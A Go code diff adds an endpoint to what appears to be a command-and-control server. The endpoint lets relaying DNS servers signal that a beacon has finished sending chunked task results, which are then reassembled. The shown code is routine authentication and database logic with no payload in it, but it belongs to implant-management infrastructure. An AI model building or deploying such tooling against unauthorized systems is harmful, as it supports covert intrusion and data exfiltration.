@@ -1716,6 +1716,62 @@ func (api *APIServer) handleSubmitResult(w http.ResponseWriter, r *http.Request)
 	})
 }
 
+// handleResultComplete processes the completion message from DNS server
+// This is called when beacon sends RESULT_COMPLETE after all chunks are transmitted
+// Master should now assemble the result (if multi-chunk) and mark task as completed
+func (api *APIServer) handleResultComplete(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		DNSServerID string `json:"dns_server_id"`
+		APIKey      string `json:"api_key"`
+		TaskID      string `json:"task_id"`
+		BeaconID    string `json:"beacon_id"`
+		TotalChunks int    `json:"total_chunks"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	// Authenticate DNS server
+	if req.DNSServerID == "" || req.APIKey == "" {
+		api.sendError(w, http.StatusUnauthorized, "missing dns_server_id or api_key")
+		return
+	}
+
+	valid, err := api.db.VerifyDNSServerAPIKey(req.DNSServerID, req.APIKey)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "authentication error")
+		return
+	}
+
+	if !valid {
+		api.sendError(w, http.StatusUnauthorized, "invalid credentials")
+		return
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] Completion signal from DNS server %s: Task %s (%d chunks)\n",
+			req.DNSServerID, req.TaskID, req.TotalChunks)
+	}
+
+	// Trigger reassembly if needed (for multi-chunk results)
+	// The database will check if all chunks are present and assemble them
+	err = api.db.MarkTaskCompleteFromBeacon(req.TaskID, req.BeaconID, req.TotalChunks)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to process completion")
+		if api.config.Debug {
+			fmt.Printf("[API] Error processing completion: %v\n", err)
+		}
+		return
+	}
+
+	api.sendSuccess(w, "completion recorded", map[string]interface{}{
+		"task_id":      req.TaskID,
+		"total_chunks": req.TotalChunks,
+	})
+}
+
 // handleSubmitProgress processes task progress updates from DNS servers
 func (api *APIServer) handleSubmitProgress(w http.ResponseWriter, r *http.Request) {
 	var req TaskProgressRequest
@@ -2414,6 +2470,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	dnsRouter.HandleFunc("/checkin", api.handleDNSServerCheckin).Methods("POST")
 	dnsRouter.HandleFunc("/beacon", api.handleBeaconReport).Methods("POST")
 	dnsRouter.HandleFunc("/result", api.handleSubmitResult).Methods("POST")
+	dnsRouter.HandleFunc("/result/complete", api.handleResultComplete).Methods("POST")
 	dnsRouter.HandleFunc("/progress", api.handleSubmitProgress).Methods("POST")
 	dnsRouter.HandleFunc("/tasks", api.handleGetTasksForDNSServer).Methods("GET")
 	dnsRouter.HandleFunc("/tasks/delivered", api.handleMarkTaskDelivered).Methods("POST")
